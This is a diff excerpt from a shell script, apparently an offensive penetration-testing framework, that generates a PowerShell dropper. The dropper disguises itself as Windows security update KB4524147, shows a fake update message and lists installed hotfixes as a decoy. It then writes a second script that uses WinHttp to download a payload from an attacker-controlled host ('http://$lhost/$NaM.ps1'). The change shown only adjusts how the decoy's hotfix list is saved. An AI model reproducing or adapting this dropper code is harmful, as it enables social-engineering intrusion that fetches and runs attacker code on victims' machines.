@@ -12069,7 +12069,8 @@ else
    echo "#>" >> $IPATH/output/$Drop.ps1
    echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
    echo "write-host \"Please Be Patience While We Search For Available Updates to \$env:userdomain System\" -ForegroundColor gray -BackgroundColor Black;" >> $IPATH/output/$Drop.ps1
-   echo "Get-HotFix -Description 'Security Update';" >> $IPATH/output/$Drop.ps1
+   echo "   \$KBid=Get-HotFix -Description 'Security Update';" >> $IPATH/output/$Drop.ps1
+   echo "   \$KBid;\$KBid | Out-File -Encoding utf8 -FilePath '.\Recent_OS_Updates.txt';" >> $IPATH/output/$Drop.ps1
    echo "echo \"\`\$host.UI.RawUI.WindowTitle = \`\"Cumulative Security Update KB4524147\`\";\" > \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
    echo "echo \"   \`\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
    echo "echo \"        \`\$proxy.open('GET','http://$lhost/$NaM.ps1',\`\$false);\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
